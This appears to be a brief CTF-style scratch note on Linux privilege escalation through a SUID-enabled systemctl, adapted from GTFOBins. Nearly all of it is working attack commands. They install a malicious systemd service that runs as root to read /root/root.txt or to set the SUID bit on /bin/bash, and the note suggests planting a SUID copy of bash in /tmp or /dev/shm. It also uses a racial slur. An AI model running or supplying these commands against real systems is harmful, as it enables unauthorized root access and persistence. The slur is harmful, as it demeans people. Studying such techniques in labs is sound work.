

```

    sudo install -m =xs $(which systemctl) .
    TF=$(mktemp).service
    echo '[Service]
    Type=oneshot
    ExecStart=/bin/sh -c "id > /tmp/output"
    [Install]
    WantedBy=multi-user.target' > $TF
    ./systemctl link $TF
    ./systemctl enable --now $TF
```


becomes

```
    sudo install -m =xs $(which systemctl) .
    TF=$(mktemp).service
    echo '[Service]
    Type=oneshot
    ExecStart=/bin/sh -c "cat /root/root.txt"
    [Install]
    WantedBy=multi-user.target' > $TF
    /bin/systemctl link $TF
    /bin/systemctl enable --now $TF

```


this works
```
    sudo install -m =xs $(which systemctl) .
    TF=$(mktemp).service
    echo '[Service]
    Type=oneshot
    ExecStart=/bin/sh -c "chmod u+s /bin/bash"
    [Install]
    WantedBy=multi-user.target' > $TF
    /bin/systemctl link $TF
    /bin/systemctl enable --now $TF

```


what also works copy  bash  (the bash binary) `/bin/bash` to /dev/shm or just tmp (anything really) and then just add the suid bit on that, dont forget the full path nigga


https://gtfobins.github.io/gtfobins/systemctl/


